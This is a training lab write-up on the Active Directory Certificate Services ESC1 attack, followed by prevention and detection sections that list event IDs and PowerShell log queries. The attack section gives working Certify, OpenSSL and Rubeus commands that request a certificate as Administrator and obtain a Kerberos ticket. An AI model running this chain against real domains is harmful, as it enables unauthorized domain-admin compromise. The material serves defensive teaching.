## Description

Active Directory Certificate Services became one of the most favorite attack vector due to:
1. Using certificates for authentication has more advantages than regular username/password credentials.
2. Most PKI servers were misconfigured/vulnerable to at least one of the 8 attack vectors discovered by SpectreOps.
Some of the advantages of using certificates are:
- Users and machines certificates are valid for 1+ years.
- Resetting a user password does not invalidate the certificate.
- Misconfigured templates allow for obtaining a certificate for any user.
- Compromising the CA's private key results in forging _Golden Certificates_.
We will demonstrate the first technique, ESC1, which description is:
- Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT.

## Attack

To begin with, we will scan the environment for vulnerabilities in the PKI infrastructure.
```powershell
.\Certify.exe find /vulnerable
```
![[certifyRequest.png]]

This template is vulnerable because:
- All Domain users can request a certificate on this template.
- The flag [CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1) is present.
- Manager approval is not required.
- The certificate can be used for 'Client Authentication'.

To abuse this template, let's run:
```powershell
.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
```

Once it finishes, we will obtain a certificate successfully. Before we can use it, we need to run:
```shell
sed -i 's/\s\s\+/\n/g' cert.pem
```
and:
```shell
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Now we have a certificate in a usable PFX format, and we can request a Kerberos TGT for Administrator and authenticate with the certificate.
```powershell
.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
```

## Prevention

The attack would not be possible if the mentioned flag wasn't enabled. Another method to thwart this attack is to require _CA certificate manager approval_ before issuing certificates.
Because there are many different privilege escalation techniques, it is advisable to regularly scan the environment with Certify to find potential PKI issues.

## Detection

When the CA generates the certificate, 2 events are logged, one for the received request (4886) and one for the issued certificate (4887). We get no details of SAN, only requester information.
If you open the certificate, under "Subject Alternative Name", we will find "Principal Name=Administrator".
This is also possible to view through `certutil -view`.
Finally, we used the certificate for authentication and obtained a TGT. This will be logged with the event ID 4768.
The events 4886 and 4887 will be generated on the machine issuing the certificate. To access them, we can do:
```cmd
runas /user:eagle\htb-student powershell
```
```powershell
New-PSSession PKI
```
```powershell
Enter-PSSession PKI
```
```powershell
Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4886'}
```
```powershell
Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4887'}
```

To view the full audit log of the events, we can pipe the output int Format-List, or save the events in an array and check them individually.
```powershell
$events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
$events[0] | Format-List -Property *
```
